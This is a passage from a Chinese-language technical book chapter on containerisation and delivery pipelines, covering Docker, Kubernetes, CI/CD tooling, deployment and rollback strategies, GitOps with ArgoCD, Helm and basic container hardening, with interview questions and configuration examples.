**层缓存优化**：把"不变的"放前面（依赖安装），"常变的"放后面（代码复制）。这样改代码时前面层用缓存，构建快。

\`\`\`dockerfile
# ❌ 慢：COPY 全部再装依赖，改任何文件都重装依赖
COPY . .
RUN npm install

# ✅ 快：先 COPY package.json 装依赖，再 COPY 源码
COPY package.json package-lock.json ./
RUN npm ci
COPY . .
\`\`\`

**其他实践**：
- 一个容器一个进程。
- 非 root 用户运行（USER指令）。
- 不在镜像里放秘密（用环境变量或 Secret 管理）。
- 固定版本 tag，不用 latest。

---

### 三、Docker Compose 多容器编排

Compose 用 YAML 定义多容器应用，一键启动开发环境。

\`\`\`yaml
version: '3.8'
services:
  app:
    build: .
    ports: ["8080:8080"]
    environment:
      DB_HOST: db
      REDIS_HOST: redis
    depends_on: [db, redis]
  db:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: secret
      MYSQL_DATABASE: appdb
    volumes: ["dbdata:/var/lib/mysql"]
  redis:
    image: redis:7-alpine
volumes:
  dbdata:
\`\`\`

\`\`\`bash
docker-compose up -d    # 启动
docker-compose logs -f  # 看日志
docker-compose down     # 停止删除
\`\`\`

Compose 适合开发、测试环境，生产用 K8s。

---

### 四、Kubernetes 核心概念

K8s 是容器编排系统，管理集群上的容器生命周期。

#### 4.1 架构

K8s 集群分 Master（控制面）和 Node（工作节点）：

**Master 组件**：
- **kube-apiserver**：所有操作的入口，REST API。
- **etcd**：分布式 KV 存储，存集群状态。
- **kube-scheduler**：决定 Pod 调度到哪个 Node。
- **kube-controller-manager**：运行控制器（副本控制器、节点控制器等）。

**Node 组件**：
- **kubelet**：管理本节点 Pod 生命周期，向 Master 汇报。
- **kube-proxy**：管理服务网络和负载均衡。
- **容器运行时**：containerd / docker，跑容器。

#### 4.2 Pod

**Pod** 是 K8s 最小调度单元。一个 Pod 含一个或多个紧密耦合的容器（共享网络、存储）。通常一 Pod 一容器。

Pod 是临时的——IP 会变、会被重建。所以不能直接访问 Pod IP，要用 Service。

#### 4.3 Deployment

Deployment 管理 Pod 副本，保证期望副本数。Pod 挂了自动重建（自愈），更新时滚动替换。

\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: order-service
spec:
  replicas: 3
  selector:
    matchLabels: { app: order-service }
  template:
    metadata:
      labels: { app: order-service }
    spec:
      containers:
      - name: order-service
        image: registry.example.com/order-service:v1.2.3
        ports: [{ containerPort: 8080 }]
        resources:
          requests: { cpu: "250m", memory: "512Mi" }
          limits: { cpu: "500m", memory: "1Gi" }
        readinessProbe:
          httpGet: { path: /actuator/health/readiness, port: 8080 }
          initialDelaySeconds: 30
        livenessProbe:
          httpGet: { path: /actuator/health/liveness, port: 8080 }
          initialDelaySeconds: 60
\`\`\`

replicas: 3 表示期望 3 个 Pod 副本。resources 设置资源请求和上限。readinessProbe 决定 Pod 是否就绪（接收流量），livenessProbe 决定是否重启不健康的 Pod。

#### 4.4 Service（服务发现）

Pod IP 会变，Service 提供稳定的访问入口和负载均衡。Service 通过 label selector 关联一组 Pod。

\`\`\`yaml
apiVersion: v1
kind: Service
metadata:
  name: order-service
spec:
  selector: { app: order-service }
  ports:
  - port: 80
    targetPort: 8080
\`\`\`

Service 类型：
- **ClusterIP**（默认）：集群内访问。
- **NodePort**：每个 Node 开放端口。
- **LoadBalancer**：云厂商提供 LB。
- **Headless**：不分配 VIP，DNS 直接返回 Pod IP（用于 StatefulSet）。

#### 4.5 Ingress（HTTP 入口）

Ingress 是七层路由，把域名/路径路由到 Service：

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: app-ingress
spec:
  rules:
  - host: api.example.com
    http:
      paths:
      - path: /orders
        pathType: Prefix
        backend:
          service: { name: order-service, port: { number: 80 } }
\`\`\`

Ingress Controller（如 Nginx Ingress、Traefik）实际执行路由。

#### 4.6 ConfigMap 与 Secret

ConfigMap 存非敏感配置，Secret 存敏感数据（Base64 编码，可挂载为文件或环境变量）。

\`\`\`yaml
apiVersion: v1
kind: ConfigMap
metadata: { name: app-config }
data:
  LOG_LEVEL: "INFO"
  DB_POOL_SIZE: "10"
---
apiVersion: v1
kind: Secret
metadata: { name: db-secret }
type: Opaque
data:
  password: c2VjcmV0  # base64("secret")
\`\`\`

Pod 引用：
\`\`\`yaml
env:
- name: DB_PASSWORD
  valueFrom:
    secretKeyRef: { name: db-secret, key: password }
\`\`\`

Secret 只是 Base64 编码，不是加密。生产环境用 Vault、Sealed Secrets、Cloud KMS 真正加密。

#### 4.7 PV 与 PVC（存储）

PV（PersistentVolume）是集群存储资源，PVC（PersistentVolumeClaim）是用户对存储的申请。StatefulSet（如数据库）用 PVC 持久化数据。

---

### 五、K8s 部署实战

#### 5.1 滚动更新（Rolling Update）

Deployment 更新镜像时，默认滚动更新：逐步创建新 Pod、逐步删除旧 Pod，保证更新过程始终有可用副本。

\`\`\`yaml
spec:
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1   # 最多 1 个不可用
      maxSurge: 1          # 最多多出 1 个
\`\`\`

maxUnavailable 控制更新过程中允许多少 Pod 不可用（保证可用性），maxSurge 控制允许多少额外 Pod（控制资源）。

#### 5.2 回滚

\`\`\`bash
kubectl rollout undo deployment/order-service              # 回滚到上一版本
kubectl rollout undo deployment/order-service --to-revision=2  # 回滚到指定版本
kubectl rollout history deployment/order-service          # 查看历史
kubectl rollout status deployment/order-service           # 查看状态
\`\`\`

K8s 保留历史 ReplicaSet（revisionHistoryLimit 默认 10），可快速回滚。

#### 5.3 HPA（自动扩缩容）

HPA 根据 CPU/内存/自定义指标自动调整副本数：

\`\`\`yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata: { name: order-service-hpa }
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: order-service
  minReplicas: 3
  maxReplicas: 20
  metrics:
  - type: Resource
    resource:
      name: cpu
      target: { type: Utilization, averageUtilization: 70 }
\`\`\`

CPU 超 70% 自动扩容，低于阈值缩容。配合 Prometheus Adapter 可基于自定义指标（QPS、队列长度）扩缩容。

#### 5.4 优雅停机

Pod 被删除时，K8s 先发 SIGTERM，等 terminationGracePeriodSeconds（默认 30s）后 SIGKILL。应用应捕获 SIGTERM，停止接收新请求，处理完在途请求，再退出。配合 preStop hook 和 readinessProbe，可实现零停机更新。

---

### 六、CI/CD 概念与价值

#### 6.1 持续集成（CI）

CI 要求团队频繁把代码合并到主干，每次合并自动构建和测试。核心价值：
- **早发现集成问题**：小步合并，问题范围小，易定位。
- **保证主干始终可构建**：避免"集成地狱"。
- **自动化测试**：每次提交跑单测，防止回归。

CI 的关键是"每次提交都构建+测试"，失败立即修复，不让主干红。

#### 6.2 持续交付（CD）与持续部署（Continuous Deployment）

- **持续交付（Continuous Delivery）**：自动构建、测试、部署到预发环境，生产部署需人工审批。
- **持续部署（Continuous Deployment）**：通过测试后自动部署到生产，无需人工干预。

持续部署是持续交付的下一步，要求极高的测试覆盖和信心。大部分公司做到持续交付，少数高成熟度团队做持续部署。

#### 6.3 CI/CD 的价值

- **快速反馈**：提交后几分钟知道是否通过，问题早发现。
- **降低发布风险**：小步快跑，每次发布变更小，出问题影响小。
- **提高发布频率**：从"每月一次大版本"到"每天多次发布"，加快迭代。
- **减少人为错误**：自动化取代手工操作，避免"敲错命令删库"。
- **可重复**：同样的流水线产出同样的制品，环境一致。

---

### 七、CI/CD 流水线设计

一条完整的流水线包含多个阶段（Stage），每阶段失败则终止：

#### 7.1 典型流水线阶段

1. **Checkout**：拉取代码。
2. **Lint**：代码规范检查（ESLint、Checkstyle、golangci-lint）。
3. **单元测试**：跑单测，输出覆盖率。
4. **构建**：编译打包（mvn package、npm run build、go build）。
5. **构建镜像**：docker build 打镜像，打 tag。
6. **安全扫描**：镜像漏洞扫描（Trivy）、依赖漏洞扫描（Snyk）、代码安全扫描（SonarQube）。
7. **推送镜像**：docker push 到镜像仓库。
8. **部署预发**：kubectl apply 到预发集群。
9. **集成测试**：跑接口测试、E2E 测试。
10. **审批**：人工审批（持续交付）或自动（持续部署）。
11. **部署生产**：灰度/蓝绿/滚动发布到生产。
12. **验证**：健康检查、冒烟测试、监控告警确认。

#### 7.2 流水线设计原则

- **快速失败**：快的阶段（Lint、单测）放前面，慢的（构建、E2E）放后面。
- **并行化**：不相互依赖的阶段并行跑（如 Lint 和单测并行）。
- **缓存**：缓存依赖（npm、maven），加速构建。
- **幂等**：同一提交多次跑结果一致。
- **可观测**：每阶段日志清晰，失败原因明确。

#### 7.3 GitHub Actions 示例

\`\`\`yaml
name: CI/CD
on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-java@v4
      with: { java-version: '17', distribution: 'temurin' }
    - uses: actions/cache@v3
      with:
        path: ~/.m2
        key: \${{ runner.os }}-m2-\${{ hashFiles('**/pom.xml') }}
    - run: mvn -B verify
    - run: docker build -t app:$ .
    - run: docker push registry/app:$
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
    - run: kubectl set image deployment/app app=registry/app:$
\`\`\`

---

### 八、主流 CI/CD 工具对比

| 工具 | 类型 | 特点 | 适用 |
|------|------|------|------|
| Jenkins | 自托管 | 老牌、插件多、灵活、UI 老 | 传统企业、复杂流程 |
| GitLab CI | SaaS/自托管 | 与 GitLab 深度集成、YAML 配置 | 用 GitLab 的团队 |
| GitHub Actions | SaaS | 与 GitHub 集成、生态丰富、免费额度 | 开源项目、用 GitHub 的团队 |
| CircleCI | SaaS | 速度快、配置简洁 | 中小团队 |
| ArgoCD | GitOps | 声明式、K8s 原生、Git 作为唯一真相源 | K8s + GitOps |
| Tekton | K8s 原生 | 标准化、可组合 | K8s 深度用户 |

**GitOps** 是新兴范式：Git 仓库存储声明式配置（K8s YAML），ArgoCD/Flux 监听 Git 变更自动同步到集群。优点：Git 即审计日志、回滚即 git revert、配置版本化。

---

### 九、Git 工作流与发布

#### 9.1 GitFlow

- main：生产分支，打 tag 发版。
- develop：开发集成分支。
- feature/*：功能分支，从 develop 拉，合并回 develop。
- release/*：发布分支，从 develop 拉，合并到 main 和 develop。
- hotfix/*：紧急修复，从 main 拉，合并到 main 和 develop。

GitFlow 适合发布周期长的项目，但对持续部署太重。

#### 9.2 Trunk-based Development（主干开发）

所有人直接提交到 main（或短生命周期 feature 分支），配合 feature flag 控制功能开关。适合高频发布、CI/CD 成熟的团队。Google、Netflix 都用主干开发。

#### 9.3 GitHub Flow

main + feature 分支，PR 合并即部署。简单，适合 Web 应用。

| 工作流 | 复杂度 | 发布频率 | 适用 |
|--------|--------|----------|------|
| GitFlow | 高 | 低（周/月） | 企业级、版本发布 |
| Trunk-based | 低 | 高（日/时） | 持续部署 |
| GitHub Flow | 低 | 中 | Web 应用 |

---

### 十、部署策略

#### 10.1 蓝绿部署（Blue-Green）

准备两套完全相同的环境（蓝和绿），当前生产是蓝。发布时部署到绿，测试通过后把流量切到绿。蓝保留作为回滚。

优点：切换瞬时、回滚快（切回蓝）。
缺点：需要双倍资源。

#### 10.2 金丝雀/灰度发布（Canary）

逐步把流量切到新版本：5% → 25% → 50% → 100%。每阶段观察指标（错误率、延迟），异常自动回滚。

优点：风险可控、问题影响面小。
缺点：发布慢、需要流量控制和指标观测。

#### 10.3 滚动更新（Rolling Update）

逐步替换旧 Pod 为新 Pod。K8s 默认策略。优点：无需额外资源；缺点：新旧版本并存期间可能有兼容性问题。

#### 10.4 影子部署（Shadow）

新版本接收生产流量的副本（不影响真实响应），对比新旧版本行为。适合高风险变更（如重构）。代价是双倍资源+流量复制开销。

| 策略 | 资源 | 速度 | 风险 | 回滚 | 适用 |
|------|------|------|------|------|------|
| 蓝绿 | 2x | 快 | 低 | 快 | 资源充足、需快速回滚 |
| 金丝雀 | 1.1x | 慢 | 极低 | 中 | 高风险变更、需观测 |
| 滚动 | 1.x | 中 | 中 | 中 | 常规更新 |
| 影子 | 2x | 慢 | 极低 | 无需 | 高风险、需验证 |

---

### 十一、回滚机制

发布不是终点——能快速回滚才是安全的保障。

- **K8s 回滚**：kubectl rollout undo，秒级回滚到上一镜像版本。
- **蓝绿回滚**：切流量到旧环境。
- **金丝雀回滚**：流量切回 100% 旧版本。
- **数据库回滚**：最复杂——schema 变更要前向兼容（如新增列不删列），避免回滚后旧代码不认新 schema。

回滚原则：**回滚优先于修复**。出问题先回滚恢复服务，再排查根因。不要在故障现场尝试修复。

---

### 十二、配置管理与 Secret 管理

#### 12.1 配置分层

- **构建时配置**：写死在镜像里（尽量避免）。
- **部署时配置**：ConfigMap、环境变量。
- **运行时配置**：配置中心（Apollo、Nacos），动态生效。

配置中心的好处：不重新部署即可改配置、支持灰度发布配置、配置版本化。

#### 12.2 Secret 管理

- 不要把 Secret 提交到 Git！
- K8s Secret 是 Base64，非加密。
- 用 **Vault**（HashiCorp）集中管理 Secret，应用启动时拉取。
- 用 **Sealed Secrets** / **SOPS** 加密后存 Git，部署时解密。
- 用云厂商 KMS 加密。

---

### 十三、制品管理

- **镜像仓库**：Harbor（自建，带扫描）、Docker Hub、云厂商 ACR/ECR。
- **制品仓库**：Nexus（Maven/npm/Docker 多格式）、Artifactory。
- **版本 tag**：用 Git commit hash 或 语义化版本（v1.2.3），不用 latest。

镜像命名规范：\`registry/app-name:git-commit-short-hash\`，便于追溯到具体代码。

---

### 十四、实战：Spring Boot 完整 CI/CD

1. 开发者提交代码到 feature 分支，开 PR。
2. PR 触发 CI：Lint（Checkstyle）→ 单测（JUnit）→ 构建（mvn package）→ SonarQube 扫描。
3. PR 审批合并到 main。
4. main 触发 CD：构建镜像（多阶段 Dockerfile）→ Trivy 扫描 → 推送 Harbor → 部署预发 → 集成测试 → 审批 → 灰度部署生产（5%→25%→100%）。
5. 每阶段监控错误率，异常自动回滚。

\`\`\`bash
# 构建镜像
docker build -t harbor.example.com/order-service:abc1234 .
# 推送
docker push harbor.example.com/order-service:abc1234
# 灰度（Istio VirtualService 控制 5% 流量到新版本）
kubectl set image deployment/order-service order-service=harbor.example.com/order-service:abc1234
\`\`\`

---

### 十五、本章小结

部署与 CI/CD 是"把代码安全送到生产"的工程能力。核心要点：

1. **容器化**：Docker 镜像分层、多阶段构建、最小镜像。
2. **K8s**：Pod/Deployment/Service/Ingress/ConfigMap/Secret。
3. **CI/CD**：CI 频繁集成+自动测试，CD 自动部署。
4. **流水线**：Lint→单测→构建→扫描→部署→验证，快速失败。
5. **GitOps**：Git 作为配置唯一真相源，ArgoCD 自动同步。
6. **部署策略**：蓝绿、金丝雀、滚动、影子，按风险选择。
7. **回滚优先**：出问题先回滚恢复，再修复。

下一章我们学习高可用架构，看看如何构建"永不宕机"的系统。

**面试高频问题**：

- Docker 镜像分层原理？多阶段构建好处？
- 容器隔离靠什么？和虚拟机区别？
- K8s Pod、Deployment、Service 各自作用？
- 滚动更新和蓝绿部署区别？
- CI 和 CD 区别？持续交付和持续部署？
- GitOps 是什么？ArgoCD 工作原理？
- 金丝雀发布怎么做？怎么自动回滚？
- Secret 怎么安全管理？K8s Secret 安全吗？
- HPA 自动扩缩容原理？
- 优雅停机怎么做？为什么需要 preStop hook？

**延伸阅读**：

- Kubernetes 官方文档：https://kubernetes.io/docs/
- 《CI/CD Pipeline》—— Joachim Janusz
- ArgoCD 文档：https://argo-cd.readthedocs.io/
- 《Docker Deep Dive》—— Nigel Poulton

---

## 附录 A：Docker 容器化深度剖析

### A.1 容器隔离原理

Docker 容器的隔离不是靠虚拟化（像 VM 那样），而是靠 Linux 内核的三大技术：

1. **Namespaces**：命名空间隔离。每种 namespace 隔离一种资源：
   - PID：进程隔离（容器内看不到宿主机进程）。
   - NET：网络隔离（独立网卡、IP、端口）。
   - MNT：挂载点隔离（独立文件系统视图）。
   - UTS：主机名隔离。
   - IPC：进程间通信隔离。
   - USER：用户映射（容器内 root 映射到宿主机普通用户）。

2. **Cgroups**：控制组限制资源。CPU、内存、磁盘 IO、网络带宽都可限制。防止容器吃光宿主机资源。

3. **UnionFS**：联合文件系统。Docker 镜像的分层就靠它。每层只读，顶层可写。Copy-on-Write 提高效率。

### A.2 镜像分层与 Copy-on-Write

Docker 镜像是一层层的只读文件系统。容器启动时在最上面加一个可写层。

    镜像层（只读）：
      - Layer 5: CMD ["node", "app.js"]     # 启动命令
      - Layer 4: COPY . /app                 # 复制代码
      - Layer 3: RUN npm install             # 安装依赖
      - Layer 2: WORKDIR /app                # 工作目录
      - Layer 1: FROM node:18-alpine         # 基础镜像
    
    容器层（可写）：运行时修改写到这里

**Copy-on-Write**：容器读文件时，从上往下找，找到就读。修改文件时，先把文件从下层复制到可写层，再修改。这样下层镜像不被污染，多个容器共享同一镜像层。

**构建优化**：因为分层 + 缓存，Dockerfile 中变化少的指令放前面，变化多的放后面。如先 COPY package.json + npm install，再 COPY 源码。改源码时不会重新 npm install。

### A.3 多阶段构建

多阶段构建让最终镜像只包含运行时需要的文件，不含编译工具和中间产物。

    # 阶段一：构建
    FROM node:18 AS builder
    WORKDIR /app
    COPY package*.json ./
    RUN npm ci
    COPY . .
    RUN npm run build
    
    # 阶段二：运行
    FROM nginx:alpine
    COPY --from=builder /app/dist /usr/share/nginx/html
    EXPOSE 80

最终镜像只有 nginx + 静态文件，没有 node、npm、源码。镜像从 1GB 降到 20MB。

### A.4 容器 vs 虚拟机

| 维度 | 容器 | 虚拟机 |
|------|------|--------|
| 隔离级别 | 进程级 | 硬件级 |
| 启动速度 | 秒级 | 分钟级 |
| 资源开销 | MB 级 | GB 级 |
| 密度 | 单机数百容器 | 单机数十 VM |
| 安全 | 共享内核，隔离弱 | 独立内核，隔离强 |
| 生态 | Docker/K8s | VMware/KVM |

容器轻量但不安全（共享内核），VM 重但安全。生产中两者结合——容器跑在 VM 上，兼顾效率和隔离。

### A.5 多语言对照（Dockerfile）

**Java（Spring Boot）**：

    FROM eclipse-temurin:17-jre-alpine
    COPY target/app.jar /app/app.jar
    EXPOSE 8080
    ENTRYPOINT ["java", "-jar", "/app/app.jar"]

**Go**：

    FROM golang:1.21 AS builder
    COPY . /app
    RUN CGO_ENABLED=0 go build -o server ./...
    
    FROM alpine:latest
    COPY --from=builder /app/server /server
    ENTRYPOINT ["/server"]

**Python**：

    FROM python:3.11-slim
    COPY requirements.txt .
    RUN pip install --no-cache-dir -r requirements.txt
    COPY . /app
    WORKDIR /app
    CMD ["python", "main.py"]

---

## 附录 B：Kubernetes 架构详解

### B.1 控制面组件

1. **API Server**：所有操作的入口。kubectl、Controller、Scheduler 都通过 API Server 交互。
2. **etcd**：键值存储，存所有集群状态。集群的"大脑"。
3. **Scheduler**：调度器，决定 Pod 跑在哪个 Node。
4. **Controller Manager**：控制器，维护期望状态（如 Deployment 3 副本，少了自动创建）。
5. **Cloud Controller Manager**：云厂商控制器（如 AWS、阿里云的负载均衡集成）。

### B.2 工作节点组件

1. **kubelet**：节点代理，管理 Pod 生命周期。接收 API Server 指令，启停容器。
2. **kube-proxy**：网络代理，实现 Service 的负载均衡（iptables/ipvs 规则）。
3. **Container Runtime**：容器运行时（containerd、CRI-O），跑容器。

### B.3 Pod 生命周期

Pod 是 K8s 最小调度单位。一个 Pod 可以含多个容器（通常一个主容器 + 辅助容器）。

**Pod 状态**：

- Pending：已创建，等待调度。
- Running：已调度，容器运行中。
- Succeeded：容器正常退出（Job）。
- Failed：容器异常退出。
- Unknown：状态未知（通常节点失联）。

**Pod 生命周期钩子**：

1. PostStart：容器创建后立即执行（不保证在 Entry Point 前）。
2. PreStop：容器终止前执行（优雅停机）。

    lifecycle:
      postStart:
        exec:
          command: ["/bin/sh", "-c", "echo 'started' > /tmp/status"]
      preStop:
        exec:
          command: ["/bin/sh", "-c", "nginx -s quit; sleep 10"]

### B.4 Service 与网络

Service 为一组 Pod 提供稳定的访问入口（Pod IP 会变，Service IP 不变）。

**Service 类型**：

- ClusterIP：集群内访问（默认）。
- NodePort：通过节点端口暴露（30000-32767）。
- LoadBalancer：云厂商负载均衡器。
- Headless：无 ClusterIP，直接返回 Pod IP（用于 StatefulSet）。

**Ingress**：七层路由，通过域名/路径把流量路由到不同 Service。

    apiVersion: networking.k8s.io/v1
    kind: Ingress
    spec:
      rules:
        - host: api.example.com
          http:
            paths:
              - path: /orders
                backend:
                  service:
                    name: order-service
                    port:
                      number: 8080
              - path: /users
                backend:
                  service:
                    name: user-service
                    port:
                      number: 8080

### B.5 配置管理

**ConfigMap**：存非敏感配置。

    apiVersion: v1
    kind: ConfigMap
    metadata:
      name: app-config
    data:
      DATABASE_URL: "mysql://db:3306/myapp"
      LOG_LEVEL: "info"

**Secret**：存敏感信息（Base64 编码，非加密）。

    apiVersion: v1
    kind: Secret
    metadata:
      name: db-secret
    type: Opaque
    data:
      password: cGFzc3dvcmQxMjM=  # base64("password123")

**安全建议**：K8s Secret 默认只 Base64 编码，不是加密。生产环境用：
- 云厂商 KMS（如 AWS KMS、阿里云 KMS）加密。
- Sealed Secrets / SOPS / External Secrets Operator。
- Vault 动态密钥管理。

---

## 附录 C：CI/CD 流水线详解

### C.1 流水线阶段设计

一个成熟的 CI/CD 流水线通常包含：

1. **Checkout**：拉取代码。
2. **Lint**：代码规范检查（ESLint、golangci-lint、pylint）。
3. **Unit Test**：单元测试。
4. **Build**：编译/打包（mvn package、go build、npm run build）。
5. **Security Scan**：安全扫描（SonarQube、Trivy、Snyk）。
6. **Docker Build**：构建容器镜像。
7. **Push**：推送镜像到 Registry。
8. **Deploy Staging**：部署到预发环境。
9. **Integration Test**：集成测试 / E2E 测试。
10. **Deploy Production**：部署到生产（可手动审批）。
11. **Smoke Test**：生产冒烟测试。
12. **Notify**：通知团队（Slack/钉钉）。

### C.2 GitHub Actions 示例

    name: CI/CD
    
    on:
      push:
        branches: [main]
      pull_request:
        branches: [main]
    
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/setup-node@v4
            with:
              node-version: '18'
              cache: 'npm'
          - run: npm ci
          - run: npm run lint
          - run: npm test
          - run: npm run build
      
      docker:
        needs: test
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: docker/login-action@v3
            with:
              registry: ghcr.io
              username: \${{ github.actor }}
              password: \${{ secrets.GITHUB_TOKEN }}
          - uses: docker/build-push-action@v5
            with:
              push: true
              tags: ghcr.io/\${{ github.repository }}:\${{ github.sha }}
      
      deploy:
        needs: docker
        runs-on: ubuntu-latest
        environment: production
        steps:
          - uses: actions/checkout@v4
          - name: Deploy to K8s
            run: |
              kubectl set image deployment/app app=ghcr.io/\${{ github.repository }}:\${{ github.sha }}
              kubectl rollout status deployment/app

### C.3 GitLab CI 示例

    stages:
      - test
      - build
      - deploy
    
    test:
      stage: test
      image: node:18
      script:
        - npm ci
        - npm test
        - npm run lint
    
    build:
      stage: build
      image: docker:24
      services: [docker:24-dind]
      script:
        - docker build -t \${CI_REGISTRY_IMAGE}:\${CI_COMMIT_SHA} .
        - docker push \${CI_REGISTRY_IMAGE}:\${CI_COMMIT_SHA}
      only: [main]
    
    deploy:
      stage: deploy
      script:
        - kubectl set image deployment/app app=\${CI_REGISTRY_IMAGE}:\${CI_COMMIT_SHA}
      only: [main]
      when: manual  # 手动触发

### C.4 Jenkins Pipeline 示例

    pipeline {
      agent any
      stages {
        stage('Test') {
          steps {
            sh 'npm ci && npm test'
          }
        }
        stage('Build') {
          steps {
            sh 'docker build -t myapp:\${BUILD_NUMBER} .'
            sh 'docker push myapp:\${BUILD_NUMBER}'
          }
        }
        stage('Deploy') {
          input { message 'Deploy to production?' }
          steps {
            sh 'kubectl set image deployment/app app=myapp:\${BUILD_NUMBER}'
          }
        }
      }
      post {
        failure { slackSend 'Build failed!' }
        success { slackSend 'Build succeeded!' }
      }
    }

---

## 附录 D：部署策略详解

### D.1 滚动更新（Rolling Update）

逐批替换旧版本 Pod。K8s 默认策略。

    strategy:
      type: RollingUpdate
      rollingUpdate:
        maxSurge: 1          # 每次最多多创建 1 个 Pod
        maxUnavailable: 0    # 不允许减少可用 Pod

优点：零停机、资源利用率高。
缺点：新旧版本共存期间可能有兼容性问题。回滚慢（要逆向滚动）。

### D.2 蓝绿部署（Blue-Green）

两套环境（蓝/绿），切换流量。

    # 当前蓝环境运行 v1.0
    kubectl apply -f deployment-green.yaml  # 部署 v2.0 到绿环境
    kubectl patch service app -p '{"spec":{"selector":{"version":"green"}}}'  # 切流量到绿

优点：秒级切换、秒级回滚（切回蓝）。
缺点：需要双倍资源。两套环境数据要同步。

### D.3 金丝雀发布（Canary）

小流量先试新版本，逐步扩大。

    # 用 Argo Rollouts 做金丝雀
    strategy:
      canary:
        steps:
          - setWeight: 10      # 10% 流量到新版本
          - pause: { duration: 5m }  # 观察 5 分钟
          - setWeight: 30      # 30%
          - pause: { duration: 5m }
          - setWeight: 50      # 50%
          - pause: { duration: 5m }
          - setWeight: 100     # 全量

优点：风险可控、可自动回滚（基于指标）。
缺点：实现复杂、需要流量分割能力。

### D.4 影子部署（Shadow）

新版本接收生产流量的副本，但不返回响应。只用于测试。

优点：零风险验证（用户不受影响）。
缺点：资源浪费（双倍处理）、有副作用风险（如重复写 DB）。

### D.5 策略选择

| 策略 | 停机 | 资源 | 回滚速度 | 复杂度 | 适用 |
|------|------|------|----------|--------|------|
| 滚动 | 无 | 低 | 慢 | 低 | 常规更新 |
| 蓝绿 | 无 | 高 | 快 | 中 | 大版本升级 |
| 金丝雀 | 无 | 中 | 快 | 高 | 高风险变更 |
| 影子 | 无 | 高 | N/A | 高 | 性能验证 |

---

## 附录 E：GitOps 与 ArgoCD

### E.1 GitOps 理念

GitOps 的核心：Git 仓库是系统状态的"唯一真相源"。

1. 把 K8s YAML（Deployment、Service 等）存 Git。
2. ArgoCD 监听 Git 仓库。
3. Git 有变更，ArgoCD 自动同步到集群。
4. 集群状态偏离 Git，ArgoCD 自动纠正。

好处：

- **审计**：每次变更都有 Git commit 记录。
- **回滚**：git revert 即可回滚部署。
- **多环境**：不同分支对应不同环境（dev/staging/prod）。
- **权限**：通过 Git PR 控制部署权限。

### E.2 ArgoCD 工作流程

1. 开发者改代码，推到应用仓库。
2. CI 构建镜像，更新 Git 配置仓库中的镜像 tag。
3. ArgoCD 检测到 Git 配置变更。
4. ArgoCD 把新配置同步到 K8s 集群。
5. K8s 滚动更新 Pod。

### E.3 ArgoCD Application 示例

    apiVersion: argoproj.io/v1alpha1
    kind: Application
    metadata:
      name: my-app
    spec:
      source:
        repoURL: https://github.com/org/k8s-configs
        targetRevision: main
        path: production/my-app
      destination:
        server: https://kubernetes.default.svc
        namespace: production
      syncPolicy:
        automated:
          prune: true       # 删除 Git 中已删除的资源
          selfHeal: true    # 自动纠正手动修改
        syncOptions:
          - CreateNamespace=true

---

## 附录 F：配置管理详解

### F.1 十二要素应用配置原则

"配置应存在环境变量中，不要硬编码。"

配置分三类：

1. **环境配置**：DB 地址、端口、域名。随环境变化。
2. **应用配置**：超时时间、限流阈值。随业务调整。
3. **密钥配置**：密码、Token、API Key。需加密。

### F.2 配置中心

配置中心（如 Nacos、Apollo、Consul KV）集中管理配置：

1. **动态更新**：改配置不重启应用。
2. **多环境**：dev/staging/prod 配置隔离。
3. **版本管理**：配置变更有记录。
4. **灰度发布**：部分实例先用新配置。

### F.3 多语言对照（配置中心）

**Java（Nacos）**：

    @NacosValue(value = "\${order.timeout}", autoRefreshed = true)
    private int orderTimeout;

**Go（Viper）**：

    viper.AddRemoteProvider("nacos", "nacos:8848", "/config/app")
    viper.WatchConfig()  // 监听配置变化
    viper.OnConfigChange(func(e fsnotify.Event) {
        timeout = viper.GetInt("order.timeout")
    })

**Python（python-nacos）**：

    from nacos import NacosClient
    client = NacosClient('nacos:8848', namespace='prod')
    config = client.get_config('app-config', 'DEFAULT_GROUP')

**Node.js（nacos-client）**：

    const Nacos = require('nacos');
    const client = new Nacos.NacosConfigClient({ serverAddr: 'nacos:8848' });
    const config = await client.getConfig('app-config', 'DEFAULT_GROUP');
    client.subscribe({ dataId: 'app-config' }, (newConfig) => {
      // 配置变更回调
    });

---

## 附录 G：Helm 包管理

Helm 是 K8s 的"包管理器"，类似 apt/yum。用 Chart 模板化部署。

### G.1 Chart 结构

    my-chart/
      Chart.yaml          # Chart 元信息
      values.yaml         # 默认配置
      templates/
        deployment.yaml   # Deployment 模板
        service.yaml      # Service 模板
        ingress.yaml      # Ingress 模板

### G.2 模板示例

    # templates/deployment.yaml
    apiVersion: apps/v1
    kind: Deployment
    metadata:
      name: \{\{ .Release.Name \}\}
    spec:
      replicas: \{\{ .Values.replicaCount \}\}
      template:
        spec:
          containers:
            - name: app
              image: "\{\{ .Values.image.repository \}\}:\{\{ .Values.image.tag \}\}"
              resources:
                limits:
                  cpu: \{\{ .Values.resources.limits.cpu \}\}

### G.3 使用

    # 安装
    helm install my-app ./my-chart -f values-prod.yaml
    
    # 升级
    helm upgrade my-app ./my-chart -f values-prod.yaml
    
    # 回滚
    helm rollback my-app 1  # 回滚到 revision 1

Helm 让 K8s 部署"可复用、可版本化、可参数化"。

---

## 附录 H：容器安全

### H.1 镜像安全

1. **用可信基础镜像**：官方镜像 > 第三方镜像。Alpine 版本更小更安全。
2. **定期扫描**：Trivy、Clair、Snyk 扫描镜像漏洞。
3. **最小权限**：不用 root 用户运行。

    # Dockerfile
    RUN addgroup -S app && adduser -S app -G app
    USER app  # 以非 root 用户运行

4. **多阶段构建**：最终镜像不含编译工具，减小攻击面。
5. **固定版本**：FROM node:18.19.0-alpine 而非 node:latest。

### H.2 运行时安全

1. **只读文件系统**：docker run --read-only。
2. **禁用特权**：不用 --privileged。
3. **限制 capabilities**：drop ALL，按需 add。
